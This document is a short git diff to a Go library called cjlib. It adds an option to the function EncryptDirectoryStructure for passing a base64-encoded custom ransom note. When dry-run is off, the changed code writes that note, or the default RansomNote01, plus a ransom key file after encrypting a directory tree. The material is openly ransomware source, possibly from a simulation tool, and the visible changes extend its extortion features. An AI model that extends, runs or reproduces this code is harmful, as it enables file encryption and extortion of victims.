@@ -1,6 +1,7 @@
 package cjlib
 
 import (
+    b64 "encoding/base64"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rsa"
@@ -171,7 +172,7 @@ func DisplayWebPage(url string) error {
 
 func EncryptDirectoryStructure(
 	startdir string, aeskey [32]byte, exclude string,
-	newext string, norename bool, dryrun bool) (int, int, int, error) {
+	newext string, ransom_note string, norename bool, dryrun bool) (int, int, int, error) {
 
 	if len(startdir) == 0 {
 		return 0, 0, 0, errors.New("You must provide a starting directory")
@@ -237,7 +238,13 @@ func EncryptDirectoryStructure(
 
 	if !dryrun {
 		fmt.Printf("\n[*] %d files encrypted. %d files skipped.\n", totalfiles, skipped)
-		writeRansomNote(startdir, RansomNote01)
+        // logic here
+        if len(ransom_note) > 0 {
+            decoded, _ := b64.StdEncoding.DecodeString(ransom_note)
+		    writeRansomNote(startdir, string(decoded))
+        } else {
+		    writeRansomNote(startdir, RansomNote01)
+        }
 		writeRansomKeyFile(startdir, aeskey)
 	} else {
 		fmt.Printf("\n[*] %d eligible files. %d files skipped.\n", totalfiles, skipped)
